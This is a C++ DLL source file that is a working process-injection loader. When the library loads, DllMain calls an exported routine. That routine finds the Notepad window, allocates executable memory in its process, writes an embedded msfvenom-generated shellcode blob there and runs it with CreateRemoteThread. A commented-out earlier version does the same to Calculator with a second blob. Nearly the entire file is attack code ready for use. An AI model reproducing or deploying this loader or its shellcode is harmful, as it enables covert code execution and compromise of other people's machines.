// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "Windows.h"
#include <thread>
#include <string>
#include <libloaderapi.h>
void get_pro_id(const char* window_title, DWORD& process_id)
{
	GetWindowThreadProcessId(FindWindow(NULL, window_title), &process_id);
}
//int main() {
//	DWORD proc_id = NULL;
//	const char* window_title = "Calculator";
//	unsigned char shellcode[] = "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
//		"\xff\xff\x48\xbb\xe7\xd1\xd0\xbe\xae\xcd\xd7\x72\x48\x31\x58"
//		"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x1b\x99\x53\x5a\x5e\x25"
//		"\x17\x72\xe7\xd1\x91\xef\xef\x9d\x85\x23\xb1\x99\xe1\x6c\xcb"
//		"\x85\x5c\x20\x87\x99\x5b\xec\xb6\x85\x5c\x20\xc7\x99\x5b\xcc"
//		"\xfe\x85\xd8\xc5\xad\x9b\x9d\x8f\x67\x85\xe6\xb2\x4b\xed\xb1"
//		"\xc2\xac\xe1\xf7\x33\x26\x18\xdd\xff\xaf\x0c\x35\x9f\xb5\x90"
//		"\x81\xf6\x25\x9f\xf7\xf9\xa5\xed\x98\xbf\x7e\x46\x57\xfa\xe7"
//		"\xd1\xd0\xf6\x2b\x0d\xa3\x15\xaf\xd0\x00\xee\x25\x85\xcf\x36"
//		"\x6c\x91\xf0\xf7\xaf\x1d\x34\x24\xaf\x2e\x19\xff\x25\xf9\x5f"
//		"\x3a\xe6\x07\x9d\x8f\x67\x85\xe6\xb2\x4b\x90\x11\x77\xa3\x8c"
//		"\xd6\xb3\xdf\x31\xa5\x4f\xe2\xce\x9b\x56\xef\x94\xe9\x6f\xdb"
//		"\x15\x8f\x36\x6c\x91\xf4\xf7\xaf\x1d\xb1\x33\x6c\xdd\x98\xfa"
//		"\x25\x8d\xcb\x3b\xe6\x01\x91\x35\xaa\x45\x9f\x73\x37\x90\x88"
//		"\xff\xf6\x93\x8e\x28\xa6\x89\x91\xe7\xef\x97\x9f\xf1\x0b\xf1"
//		"\x91\xec\x51\x2d\x8f\x33\xbe\x8b\x98\x35\xbc\x24\x80\x8d\x18"
//		"\x2e\x8d\xf7\x10\xba\xa4\x40\xb8\xe2\xe2\xbe\xae\x8c\x81\x3b"
//		"\x6e\x37\x98\x3f\x42\x6d\xd6\x72\xe7\x98\x59\x5b\xe7\x71\xd5"
//		"\x72\xe6\x6a\x10\x16\xaf\x4d\x96\x26\xae\x58\x34\xf2\x27\x3c"
//		"\x96\xc8\xab\xa6\xf6\xb9\x51\x18\x9b\xfb\x0d\xb9\xd1\xbf\xae"
//		"\xcd\x8e\x33\x5d\xf8\x50\xd5\xae\x32\x02\x22\xb7\x9c\xe1\x77"
//		"\xe3\xfc\x17\x3a\x18\x11\x98\x37\x6c\x85\x28\xb2\xaf\x58\x11"
//		"\xff\x14\x27\xd8\xad\x07\x2e\x05\xf6\x27\x0a\xbd\x62\xa6\x89"
//		"\x9c\x37\x4c\x85\x5e\x8b\xa6\x6b\x49\x1b\xda\xac\x28\xa7\xaf"
//		"\x50\x14\xfe\xac\xcd\xd7\x3b\x5f\xb2\xbd\xda\xae\xcd\xd7\x72"
//		"\xe7\x90\x80\xff\xfe\x85\x5e\x90\xb0\x86\x87\xf3\x9f\x0d\xbd"
//		"\x7f\xbe\x90\x80\x5c\x52\xab\x10\x36\xc3\x85\xd1\xbf\xe6\x40"
//		"\x93\x56\xff\x17\xd0\xd6\xe6\x44\x31\x24\xb7\x90\x80\xff\xfe"
//		"\x8c\x87\x3b\x18\x11\x91\xee\xe7\x32\x1f\x3f\x6e\x10\x9c\x37"
//		"\x6f\x8c\x6d\x0b\x2b\xee\x56\x41\x7b\x85\xe6\xa0\xaf\x2e\x1a"
//		"\x35\xa0\x8c\x6d\x7a\x60\xcc\xb0\x41\x7b\x76\x27\xc7\x45\x87"
//		"\x91\x04\x08\x58\x6a\xef\x18\x04\x98\x3d\x6a\xe5\xeb\x74\x9b"
//		"\xdb\x50\x45\x4e\xb8\xd2\xc9\xa0\xc2\xa2\xd1\xc4\xcd\x8e\x33"
//		"\x6e\x0b\x2f\x6b\xae\xcd\xd7\x72";
//	HANDLE processHandle;
//	HANDLE remoteThread;
//	PVOID remoteBuffer;
//	get_pro_id(window_title, proc_id);
//	processHandle = OpenProcess(PROCESS_ALL_ACCESS, NULL, proc_id);
//	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
//	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
//	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
//	CloseHandle(processHandle);
//
//	return 0;
//}
extern "C" __declspec(dllexport) int main() {
	DWORD proc_id = NULL;
	const char* window_title = "Untitled - Notepad";
	//Shellcode you will generate with msfvenom and insert in value shellcode[] ^^
	unsigned char shellcode[] = "\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\x1e\x94\x57\xd5\x12\x9a\x7e\x96\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe2\xdc\xd4\x31\xe2\x72"
"\xb2\x96\x1e\x94\x16\x84\x53\xca\x2c\xc7\x48\xdc\x66\x07\x77"
"\xd2\xf5\xc4\x7e\xdc\xdc\x87\x0a\xd2\xf5\xc4\x3e\xdc\xdc\xa7"
"\x42\xd2\x71\x21\x54\xde\x1a\xe4\xdb\xd2\x4f\x56\xb2\xa8\x36"
"\xa9\x10\xb6\x5e\xd7\xdf\x5d\x5a\x94\x13\x5b\x9c\x7b\x4c\xd5"
"\x06\x9d\x99\xc8\x5e\x1d\x5c\xa8\x1f\xd4\xc2\xfc\xff\xee\x06"
"\x9f\x55\xda\x97\xe8\x7e\x96\x1e\x1f\xd7\x5d\x12\x9a\x7e\xde"
"\x9b\x54\x23\xb2\x5a\x9b\xae\xc6\x95\xdc\x4f\x91\x99\xda\x5e"
"\xdf\x1f\x44\xb4\x83\x5a\x65\xb7\xd7\x95\xa0\xdf\x9d\x13\x4c"
"\x33\xa7\xd7\xdc\x66\x15\xbe\xdb\xbf\x5f\x13\xd5\x56\x14\x2a"
"\x7a\x0b\x67\x52\x97\x1b\xf1\x1a\xdf\x47\x47\x6b\x4c\x0f\x91"
"\x99\xda\x5a\xdf\x1f\x44\x31\x94\x99\x96\x36\xd2\x95\xd4\x4b"
"\x9c\x13\x4a\x3f\x1d\x1a\x1c\x1f\xd4\xc2\xdb\x26\xd7\x46\xca"
"\x0e\x8f\x53\xc2\x3f\xcf\x5f\xce\x1f\x56\xfe\xba\x3f\xc4\xe1"
"\x74\x0f\x94\x4b\xc0\x36\x1d\x0c\x7d\x1c\x2a\xed\x65\x23\xdf"
"\xa0\xe3\x24\xe7\x4d\xa9\x4c\x96\x1e\xd5\x01\x9c\x9b\x7c\x36"
"\x17\xf2\x34\x56\xd5\x12\xd3\xf7\x73\x57\x28\x55\xd5\x13\x21"
"\xbe\x3e\x1f\x14\x16\x81\x5b\x13\x9a\xda\x97\x65\x16\x6f\x5e"
"\xed\x58\x91\xe1\x41\x1b\x5c\xf8\xf2\x7f\x97\x1e\x94\x0e\x94"
"\xa8\xb3\xfe\xfd\x1e\x6b\x82\xbf\x18\xdb\x20\xc6\x4e\xd9\x66"
"\x1c\x5f\xab\xbe\xde\xe1\x54\x1f\x5c\xd0\xd2\x81\x56\x56\x1d"
"\x96\x94\xa8\x70\x71\x49\xfe\x6b\x82\x9d\x9b\x5d\x14\x86\x5f"
"\xcc\x1b\x5c\xf0\xd2\xf7\x6f\x5f\x2e\xce\x70\x66\xfb\x81\x43"
"\x9b\x54\x23\xdf\x5b\x65\xb0\xe3\xfb\x7c\xc4\xd5\x12\x9a\x36"
"\x15\xf2\x84\x1f\x5c\xf0\xd7\x4f\x5f\x74\x90\x16\x8d\x5a\x13"
"\x87\xd7\xa4\x96\x8e\x1d\x4d\x65\xab\x15\xe6\x94\x29\x80\x5a"
"\x19\xba\xb6\x40\x1d\xa1\xbf\x52\xdb\x27\xfe\x1e\x84\x57\xd5"
"\x53\xc2\x36\x1f\xec\xdc\x66\x1c\x53\x20\x26\x32\x4d\x71\xa8"
"\x00\x5a\x13\xbd\xdf\x97\x53\x1a\xe4\xdb\xd3\xf7\x66\x56\x1d"
"\x8d\x9d\x9b\x63\x3f\x2c\x1c\x4d\x9f\x8a\xed\x4f\xfd\x6e\x1e"
"\xe9\x7f\x8d\x53\xcd\x27\xfe\x1e\xd4\x57\xd5\x53\xc2\x14\x96"
"\x44\xd5\xed\xde\x3d\x95\x4e\x69\xcb\xc3\x0e\x94\xa8\xef\x10"
"\xdb\x7f\x6b\x82\x9c\xed\x54\x97\xaa\xe1\x6b\xa8\x9d\x13\x59"
"\x36\xbf\xd8\xdc\xd2\x23\x67\x2e\x3f\x69\xf9\xcc\x3d\xd5\x4b"
"\xd3\xb9\x54\xee\x21\xf5\x83\xed\x4f\x7e\x96";
	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	get_pro_id(window_title, proc_id);
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, NULL, proc_id);
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);

	return 0;
}
BOOL WINAPI DllMain(
	HINSTANCE hinstDLL,  
	DWORD fdwReason,    
	LPVOID lpReserved)  
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		main();
		break;

	case DLL_THREAD_ATTACH:
		break;

	case DLL_THREAD_DETACH:
		break;

	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

